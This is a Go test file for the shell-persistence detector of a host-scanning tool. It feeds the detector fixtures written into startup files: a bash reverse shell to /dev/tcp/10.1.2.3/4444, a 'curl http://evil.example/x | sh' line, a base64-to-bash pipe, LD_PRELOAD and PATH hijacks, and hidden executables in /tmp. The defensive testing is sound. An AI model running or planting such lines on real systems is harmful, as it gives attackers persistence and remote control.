package persistence

import (
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

func TestShellNormalPathNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/profile", `# /etc/profile: system-wide .profile file
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH
`)
	rep := f.scan()
	for _, fl := range rep.Findings {
		if fl.Severity.Rank() >= finding.Medium.Rank() {
			t.Fatalf("normal PATH produced %s finding: %s", fl.Severity, fl.Title)
		}
	}
}

func TestShellAliasesNotEvidence(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.bashrc", `alias ll='ls -alF'
alias grep='grep --color=auto'
PS1='\u@\h:\w\$ '
export EDITOR=vim
`)
	rep := f.scan()
	for _, fl := range rep.Findings {
		if fl.Severity.Rank() >= finding.Medium.Rank() {
			t.Fatalf("aliases/env produced %s finding: %s (%s)", fl.Severity, fl.Title, fl.Evidence)
		}
	}
}

func TestShellSuspiciousCommand(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/tmp/.x/agent", "script")
	f.write("/home/ubuntu/.bashrc", "/tmp/.x/agent --start\n")
	rep := f.scan()
	countRule(t, rep, "shell-writable-exec", 1)
	countRule(t, rep, "shell-hidden-exec", 1)
}

func TestShellHiddenExecutable(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/root/.cfg/refresh", "script")
	f.write("/root/.bash_profile", "/root/.cfg/refresh\n")
	rep := f.scan()
	countRule(t, rep, "shell-hidden-exec", 1)
	fl := findingsByRule(rep)["shell-hidden-exec"][0]
	if fl.Target != "/root/.cfg/refresh" {
		t.Errorf("target = %q", fl.Target)
	}
}

func TestShellLDPreloadExport(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.profile", "export LD_PRELOAD=/tmp/hook.so\n")
	f.write("/etc/profile.d/profiler.sh", "export LD_PRELOAD=/usr/lib/libprofiler.so\n")
	f.write("/usr/lib/libprofiler.so", elfBytes(62))
	rep := f.scan()
	countRule(t, rep, "shell-ldpreload-export", 2)
	var high, info int
	for _, fl := range findingsByRule(rep)["shell-ldpreload-export"] {
		switch fl.Severity {
		case finding.High:
			high++
		case finding.Info:
			info++
		}
	}
	if high != 1 || info != 1 {
		t.Fatalf("expected one HIGH (writable lib) and one INFO (package dir), got HIGH=%d INFO=%d", high, info)
	}
}

func TestShellSourceExternalFile(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.bashrc", "source /tmp/setup-env.sh\n")
	rep := f.scan()
	countRule(t, rep, "shell-suspicious-source", 1)
	fl := findingsByRule(rep)["shell-suspicious-source"][0]
	if fl.Target != "/tmp/setup-env.sh" {
		t.Errorf("target = %q", fl.Target)
	}
}

func TestShellSourceLegitimateLocations(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.bashrc", `source /etc/profile
. /usr/share/doc/pkg/completion.sh
source ~/.nvm/nvm.sh
`)
	rep := f.scan()
	for _, fl := range rep.Findings {
		if fl.Rule == "shell-suspicious-source" {
			t.Fatalf("legitimate source reported: %s", fl.Evidence)
		}
	}
}

func TestShellCommentsAndStringsNotEvidence(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.bashrc", `# curl http://evil.example/x | sh is a suspicious pattern
echo "documentation mentions /tmp/.payload from the training material"
`)
	rep := f.scan()
	countRule(t, rep, "shell-download-exec", 0)
	countRule(t, rep, "shell-writable-exec", 0)
}

func TestShellReverseShell(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/rc.local", "bash -i >& /dev/tcp/10.1.2.3/4444 0>&1\n")
	rep := f.scan()
	countRule(t, rep, "shell-reverse-shell", 1)
	fl := findingsByRule(rep)["shell-reverse-shell"][0]
	if fl.Severity != finding.Critical {
		t.Errorf("reverse shell must be CRITICAL, got %s", fl.Severity)
	}
}

func TestShellPathInjection(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.profile", "PATH=/tmp/bin:$PATH\nexport PATH\n")
	rep := f.scan()
	countRule(t, rep, "shell-path-injection", 1)
}

func TestShellMultipleShellTypesScanned(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/tmp/.z/agent", "script")
	f.write("/etc/zshrc", "/tmp/.z/agent --watch\n")
	f.write("/home/ubuntu/.zshenv", "/tmp/.z/agent --watch\n")
	rep := f.scan()
	// The same payload referenced from two shell files yields one finding
	// per artifact (different paths), both attributed to the shell family.
	countRule(t, rep, "shell-writable-exec", 2)
	for _, fl := range findingsByRule(rep)["shell-writable-exec"] {
		if fl.Path != "/etc/zshrc" && fl.Path != "/home/ubuntu/.zshenv" {
			t.Errorf("unexpected artifact %q", fl.Path)
		}
	}
}

func TestShellEncodedCommand(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/home/ubuntu/.bash_login", "echo aGVsbG8= | base64 -d | bash\n")
	rep := f.scan()
	countRule(t, rep, "shell-encoded-command", 1)
}
